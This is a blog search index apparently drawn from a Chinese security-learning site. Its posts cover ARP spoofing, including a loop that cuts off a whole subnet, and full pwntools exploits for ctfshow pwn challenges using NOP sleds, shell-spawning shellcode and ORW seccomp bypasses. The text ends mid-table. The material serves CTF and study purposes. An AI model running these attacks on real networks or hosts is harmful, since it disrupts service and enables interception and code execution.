<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Arp欺骗</title>
      <link href="/2024/11/10/Arp%E6%AC%BA%E9%AA%97/"/>
      <url>/2024/11/10/Arp%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>地址解析协议ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。<br>主机发送信息时将包含自标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息（只有目标IP才会回复信息，其他的会丢弃）以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p><h2 id="ARP协议的基本功能"><a href="#ARP协议的基本功能" class="headerlink" title="ARP协议的基本功能"></a>ARP协议的基本功能</h2><p><strong>基本功能</strong>：通过目标设备的IP地址，查询<strong>目标设备的</strong>MAC地址（<strong>物理地址</strong>），以保证通信的进行。</p><p><strong>局限性</strong>：仅能在<strong>局域网</strong>进行。</p><h2 id="ARP常用指令"><a href="#ARP常用指令" class="headerlink" title="ARP常用指令"></a>ARP常用指令</h2><h3 id="arp-a"><a href="#arp-a" class="headerlink" title="arp -a"></a><strong>arp -a</strong></h3><p>查看缓存中的所有项目</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251020212445269.png" alt="image-20251020212445269"></p><h3 id="arp-a-ip"><a href="#arp-a-ip" class="headerlink" title="arp -a ip"></a>arp -a ip</h3><p>如果有多人网卡，那么使用arp-a加上接口的lP地址，就可以只显示与该接口相关的ARP缓存项目。</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251020212451857.png" alt="image-20251020212451857"></p><h1 id="ARP断网攻击（仅供研究学习）"><a href="#ARP断网攻击（仅供研究学习）" class="headerlink" title="ARP断网攻击（仅供研究学习）"></a>ARP断网攻击（仅供研究学习）</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>ARP欺骗（英语：ARPspoofing），又称ARP毒化（ARP poisoning，网上上多译为ARP病毒）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域<br>网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包且可让网上上特定计算机或所有计算机无法正常连线。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>攻击者通过伪造ARP响应包，谎称自己的MAC地址对应目标IP（如网关或另一台主机），欺骗局域网内的设备更新其ARP缓存表，导致受害者的网络流量被错误地发送到攻击者的机器，从而实现流量劫持、监听或阻断通信。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="在kali上安装工具"><a href="#在kali上安装工具" class="headerlink" title="在kali上安装工具"></a>在kali上安装工具</h3><p><strong>apt-get install dsniff</strong></p><h3 id="安装加载数字签名证书"><a href="#安装加载数字签名证书" class="headerlink" title="安装加载数字签名证书"></a>安装加载数字签名证书</h3><p><strong>下载签名：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget archive.kali.org/archive-key.asc</span><br></pre></td></tr></table></figure><p><strong>安装签名：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-key add archive-key.asc</span><br></pre></td></tr></table></figure><h3 id="使用arpsoof进行断网攻击"><a href="#使用arpsoof进行断网攻击" class="headerlink" title="使用arpsoof进行断网攻击"></a>使用arpsoof进行断网攻击</h3><p><strong>arpspoof  -i  网卡  -t 目标ip  网关</strong></p><p>在kali上网卡名如下</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251020212456905.png" alt="image-20251020212456905"></p><p>在物理机上命令</p><p><strong>ipconfig</strong></p><p>得到ip和网关</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251020212500237.png" alt="image-20251020212500237"></p><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p><strong>在kali上打开流量转发</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p><strong>永久模式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><h3 id="扫描同网段下的设备ip"><a href="#扫描同网段下的设备ip" class="headerlink" title="扫描同网段下的设备ip"></a>扫描同网段下的设备ip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP --system-dns 10.213.13.0/24</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan 10.213.13.0/24</span><br></pre></td></tr></table></figure><p>例如我的物理机ip是10.213.13.206</p><p>则<code>10.213.12.0/23</code>：表示从 <code>10.213.12.1</code> 到 <code>10.213.13.254</code> 的所有 IP</p><p>像这台LCFC则是我的联想物理机器</p><p>其ip即为10.213.13.206</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251020212503918.png" alt="image-20251020212503918"></p><p>或者用Wireshark 直接流量分析抓包</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251020212506585.png" alt="image-20251020212506585"></p><h3 id="批量断网攻击脚本（危危危！谨慎使用，仅供学习）"><a href="#批量断网攻击脚本（危危危！谨慎使用，仅供学习）" class="headerlink" title="批量断网攻击脚本（危危危！谨慎使用，仅供学习）"></a>批量断网攻击脚本（危危危！谨慎使用，仅供学习）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for ip in $(seq 1 254); do</span><br><span class="line">  sudo arpspoof -i eth0 -t 10.208.176.$ip 10.208.191.254 &amp;</span><br><span class="line">  sudo arpspoof -i eth0 -t 10.208.191.254 10.208.176.$ip &amp;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="成功示例"><a href="#成功示例" class="headerlink" title="成功示例"></a>成功示例</h3><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251020212509830.png" alt="image-20251020212509830"></p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251020212512408.png" alt="image-20251020212512408"></p><p>正常关闭即可</p><h1 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h1><p><strong>本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本平台和发布者不为此承担任何责任。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arp毒化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NOP Sled空中操作雪橇（代码滑梯）</title>
      <link href="/2024/11/10/NOP%20Sled%E7%A9%BA%E4%B8%AD%E6%93%8D%E4%BD%9C%E9%9B%AA%E6%A9%87%EF%BC%88%E4%BB%A3%E7%A0%81%E6%BB%91%E6%A2%AF%EF%BC%89/"/>
      <url>/2024/11/10/NOP%20Sled%E7%A9%BA%E4%B8%AD%E6%93%8D%E4%BD%9C%E9%9B%AA%E6%A9%87%EF%BC%88%E4%BB%A3%E7%A0%81%E6%BB%91%E6%A2%AF%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="NOP-Sled空中操作雪橇（代码滑梯）"><a href="#NOP-Sled空中操作雪橇（代码滑梯）" class="headerlink" title="NOP Sled空中操作雪橇（代码滑梯）"></a>NOP Sled空中操作雪橇（代码滑梯）</h1><h2 id="NOP-Sled"><a href="#NOP-Sled" class="headerlink" title="NOP Sled"></a>NOP Sled</h2><p><strong>NOP Sled</strong>，中文常被形象地称为“空操作雪橇”、“代码滑梯”或“NOP滑板”，是指在一段shellcode之前插入大量连续的<strong>NOP指令</strong>。</p><p>**NOP指令：**即“No Operation”指令，对于x86架构的CPU，其机器码是 <code>0x90</code>。执行该指令时，CPU不会进行任何有效操作，仅仅将程序计数器（EIP&#x2F;RIP）加一，然后继续执行下一条指令。</p><p>攻击者的目标是让程序执行流跳转到我们布置的shellcode上。但由于栈地址随机化（ASLR）等因素，我们往往无法精确预测shellcode的起始地址。NOP Sled就像在shellcode前铺上了一片长长的、平滑的雪橇道。只要程序执行流<strong>跳转到这个雪橇道的任何位置</strong>，CPU都会顺着这些NOP指令一路“滑行”下去，直到最终“滑进”并执行我们的shellcode。</p><h2 id="例题–ctfshow-pwn67"><a href="#例题–ctfshow-pwn67" class="headerlink" title="例题–ctfshow pwn67"></a>例题–ctfshow pwn67</h2><p>检查保护32位</p><p>加了canary保护栈溢出受阻，没开NX可以在栈上执行shellcode</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251013162330924.png" alt="image-20251013162330924"></p><p>进主函数</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251030141451698.png" alt="image-20251030141451698"></p><p>分析之后，他会先泄露一个地址</p><p>这个地址是&amp;v1+v2，这个v2是一个[-668，668]的一个随机数</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251030141537233.png" alt="image-20251030141537233"></p><p>下面让输入最多输入4096字节，后面可以输入一个地址，最后执行地址的内容</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251030141827676.png" alt="image-20251030141827676"></p><p>思路就是将shellcode写入这个地址中，后面调用就行，但是这个地址是个不确定的地址</p><p>就可以用到代码滑梯技术</p><p>在payload中插入大量nop，程序执行nop会向下执行，直到滑入shellcode</p><p>shellcode写入地址的计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># v2 = addr-&amp;v1 = rand() % 1337 - 668</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shell_addr = &amp;v1 + 0x15 + 0x4*3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># v1 = addr - (rand() % 1337 - 668)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shell_addr = addr - rand() % 1337 + 668 + 0x21</span></span><br></pre></td></tr></table></figure><h2 id="Exp："><a href="#Exp：" class="headerlink" title="Exp："></a>Exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28240</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------------------------------------</span></span><br><span class="line">rv = <span class="keyword">lambda</span> :p.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> x:p.recvline()</span><br><span class="line">sd = <span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y:p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line">l32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name, addr:log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">inter = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">lg = <span class="keyword">lambda</span> address,data:log.success(<span class="string">&#x27;%s: &#x27;</span>%(address)+<span class="built_in">hex</span>(data))</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="comment">#-------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">nop_len = <span class="number">1337</span></span><br><span class="line">ru(<span class="string">b&quot;location:&quot;</span>)</span><br><span class="line">addr = <span class="built_in">eval</span>(rud(<span class="string">b&quot;\n&quot;</span>))</span><br><span class="line">lg(<span class="string">&quot;addr&quot;</span>,addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># v2 = addr-&amp;v1 = rand() % 1337 - 668</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shell_addr = &amp;v1 + 0x15 + 0x4*3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># v1 = addr - (rand() % 1337 - 668)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shell_addr = addr - rand() % 1337 + 668 + 0x21</span></span><br><span class="line"></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">pay = <span class="string">b&#x27;\x90&#x27;</span>*nop_len+shell</span><br><span class="line">shell_addr = addr+<span class="number">668</span>+<span class="number">0x21</span></span><br><span class="line">ru(<span class="string">b&quot;What will you do?\n&gt; &quot;</span>)</span><br><span class="line">sl(pay)</span><br><span class="line">ru(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(shell_addr))</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Off-By-One单字节缓冲区溢出漏洞</title>
      <link href="/2024/11/10/Off-By-One/"/>
      <url>/2024/11/10/Off-By-One/</url>
      
        <content type="html"><![CDATA[<h1 id="Off-By-One单字节缓冲区溢出漏洞"><a href="#Off-By-One单字节缓冲区溢出漏洞" class="headerlink" title="Off-By-One单字节缓冲区溢出漏洞"></a>Off-By-One单字节缓冲区溢出漏洞</h1><h2 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h2><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ol><li><p><strong>溢出字节为可控制任意字节</strong>：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p></li><li><p><strong>溢出字节为 NULL 字节</strong>：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</p><p>（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OBO漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ORW沙箱逃逸</title>
      <link href="/2024/11/10/ORW%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/11/10/ORW%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="ORW沙箱逃逸"><a href="#ORW沙箱逃逸" class="headerlink" title="ORW沙箱逃逸"></a>ORW沙箱逃逸</h1><h2 id="什么是沙箱保护"><a href="#什么是沙箱保护" class="headerlink" title="什么是沙箱保护"></a>什么是沙箱保护</h2><p>沙箱保护是一种将不受信任或高风险的代码与系统其余部分隔离在受限运行环境中的安全机制，限制该代码可调用的系统调用、访问的文件和网络权限等资源，从而在发生漏洞或恶意行为时把损害控制在小范围内（常见实现有容器&#x2F;命名空间、seccomp、应用进程级沙箱和虚拟机），以实现最小权限原则并降低系统被攻破的风险。</p><h2 id="例题–ctfshow-pwn69"><a href="#例题–ctfshow-pwn69" class="headerlink" title="例题–ctfshow pwn69"></a>例题–ctfshow pwn69</h2><p>查保护64位</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251102212802867.png" alt="image-20251102212802867"></p><p>查沙箱的工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line"></span><br><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><p>开了沙箱保护，但是开了系统调用号为0，1，2，60的系统调用，也就是可以用ORW</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251102213026799.png" alt="image-20251102213026799"></p><p>主要逻辑，输入可0x38字节，加上覆盖ebp和返回地址的空间，可以溢出的空间只有0x8字节了</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251102213413404.png" alt="image-20251102213413404"></p><p>这个函数中发现有jmp rsp，跳到栈顶的意思</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251102215845130.png" alt="image-20251102215845130"></p><p>0x20字节放不下ORW，这时候看到mmap函数申请了，0x123000地址，有0x1000字节的空间可写可执行</p><p>那么写payload引导进0x123000中写入ORW即可</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251102215936524.png" alt="image-20251102215936524"></p><p>覆盖返回地址为jmp rsp，让rip跳到栈顶后面重新计算栈顶将rip指向0x30的位置</p><p>也就是缓冲区的最顶端，为的就是执行payload中的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br></pre></td></tr></table></figure><p>执行payload中内容到mmap分配的可执行空间</p><p><strong>payload构造：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">pay =asm(shellcraft.read(<span class="number">0</span>, mmap, <span class="number">0x100</span>))</span><br><span class="line">pay += asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">pay += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br></pre></td></tr></table></figure><p>交互时发送payload，随后发送ORW</p><p><strong>ORW shellcode板子</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>, mmap, <span class="number">0x100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>, mmap, <span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(orw_shellcode)</span><br></pre></td></tr></table></figure><h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28173</span>)</span><br><span class="line"><span class="comment">#-------------------------------------------------</span></span><br><span class="line">rv = <span class="keyword">lambda</span> :p.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> x:p.recvline()</span><br><span class="line">sd = <span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y:p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line">l32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name, addr:log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">inter = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">lg = <span class="keyword">lambda</span> address,data:log.success(<span class="string">&#x27;%s: &#x27;</span>%(address)+<span class="built_in">hex</span>(data))</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="comment">#-------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>, mmap, <span class="number">0x100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>, mmap, <span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line"></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">pay =asm(shellcraft.read(<span class="number">0</span>, mmap, <span class="number">0x100</span>))</span><br><span class="line">pay += asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">pay += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br><span class="line">ru(<span class="string">b&quot;to do&quot;</span>)</span><br><span class="line">sl(pay)</span><br><span class="line">sl(shellcode)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h2 id="例题–ctfshow-pwn70"><a href="#例题–ctfshow-pwn70" class="headerlink" title="例题–ctfshow pwn70"></a>例题–ctfshow pwn70</h2><p>禁用了execve</p><p>这里有个检验，strlen遇到0就终端，在shellcode前面加\x00开头的shellcode即可</p><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251103112255870.png" alt="image-20251103112255870"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 